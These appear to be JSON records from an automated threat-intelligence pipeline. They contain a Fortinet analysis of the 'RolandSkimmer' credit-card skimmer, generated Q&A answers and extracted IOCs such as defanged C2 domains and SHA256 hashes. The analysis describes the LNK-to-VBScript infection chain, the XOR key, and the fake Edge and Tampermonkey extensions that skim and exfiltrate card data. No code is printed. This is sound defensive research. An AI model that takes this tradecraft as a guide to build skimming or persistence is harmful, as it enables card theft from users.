Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server with specific parameters in the URL, including the site, data, and credit card number.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria via malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a combination of techniques, including deceptive LNK files, obfuscated scripts, and malicious browser extensions, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, and the potential impact is the theft of sensitive financial data, including credit card information, which can lead to financial loss and identity theft. The attackers' use of adaptive behavior, such as customizing the infection path based on the target's environment, makes this threat particularly challenging to detect and mitigate.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["bank", "banking trojan", "analysis", "botnet", "threat", "browser", "phishing", "malicious", "intelligence", "apt"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a \"wallet stealer\", it does target and steal financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria via malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a combination of techniques, including deceptive LNK files, obfuscated scripts, and malicious browser extensions, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, and the potential impact is the theft of sensitive financial data, including credit card information, which can lead to financial loss and identity theft. The attackers' use of adaptive behavior, such as customizing the infection path based on the target's environment, makes this threat particularly challenging to detect and mitigate.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["intelligence", "browser", "banking trojan", "bank", "threat", "apt", "phishing", "botnet", "malicious", "analysis"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from 